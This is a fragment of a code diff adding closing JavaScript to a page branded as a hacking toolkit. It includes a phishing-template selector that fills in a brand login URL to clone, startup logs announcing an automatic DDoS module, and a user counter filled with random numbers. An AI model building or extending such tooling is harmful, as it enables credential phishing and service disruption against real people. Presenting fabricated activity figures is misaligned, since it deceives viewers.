+        document.getElementById('phish-template')?.addEventListener('change', (e) => { if (e.target.value !== 'custom') { const urlInput = document.getElementById('clone-url'); if (urlInput) urlInput.value = `https://${e.target.value}.com/login`; } });
+
+        // ==================== CURSOR EFFECT ====================
+        const cursor = document.querySelector('.cursor'), cursorFollower = document.querySelector('.cursor-follower');
+        document.addEventListener('mousemove', (e) => { cursor && (cursor.style.transform = `translate(${e.clientX - 10}px, ${e.clientY - 10}px)`); cursorFollower && (cursorFollower.style.transform = `translate(${e.clientX - 20}px, ${e.clientY - 20}px)`); });
+
+        // ==================== INITIALIZE ====================
+        document.addEventListener('DOMContentLoaded', () => { 
+            typeEffect(); 
+            updateStats(); 
+            setInterval(() => { stats.activeUsers = Math.floor(Math.random() * 100) + 50; updateStats(); }, 5000); 
+            addLog('K4LZZ Hacking Tools v4.0 initialized', 'system');
+            addLog('Auto DDoS with Port Detection - ACTIVE', 'system');
+            addLog('All modules loaded successfully', 'system');
+            addLog('Ready for operation', 'success');
+        });
+    </script>
 </body>
 </html>
